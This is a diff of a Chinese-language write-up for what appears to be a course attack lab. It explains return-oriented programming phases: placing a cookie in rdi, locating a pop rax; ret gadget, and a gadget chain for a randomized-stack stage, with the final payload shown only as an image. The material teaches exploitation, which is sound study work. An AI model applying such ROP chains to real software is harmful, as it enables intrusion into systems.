@@ -76,7 +76,7 @@ ret
 
 ## 2.
 
-这一问的要求是保证rdi的值，所以我们可能需要一个 mov rdi,xxx的gadget用以将cookie转移。
+这一问的要求是保证rdi的值为cookie，所以我们可能需要一个 mov rdi,xxx的gadget用以将cookie转移到rdi上。
 
 首先提取出farm.asm:
 
@@ -106,7 +106,7 @@ ret
 
 ![17](./images/17.png)
 
-那么这里的58 c3对应的pop rax;ret就是我们需要得到的内容。
+那么这里0x401f16(即58 c3)对应的pop rax;ret就是我们需要得到的内容。
 
 具体的shellcode构造如下：
 
@@ -118,3 +118,39 @@ ret
 
 这一问由于加入了随机栈的因素，相比前者会稍微复杂一些。
 
+需要保证的是：rdi
+
+
+
+
+
+
+
+
+
+
+
+```bash
+pop rax
+ret
+mov ecx,rax
+ret
+mov edx,ecx
+ret
+mov esi,edx
+ret
+mov rax,rsp
+ret
+mov rdi,rax
+ret
+lea rax,[rdi+rsi*1]
+ret
+mov rdi,rax
+ret
+```
+
+(实际上中间还会出现xchg ecx,eax指令，不过两个寄存器的值相同，经gdb调试可知不影响结果)
+
+最终得到的shellcode如下：
+
+![image-20260512131044454](./images/image-20260512131044454.png)
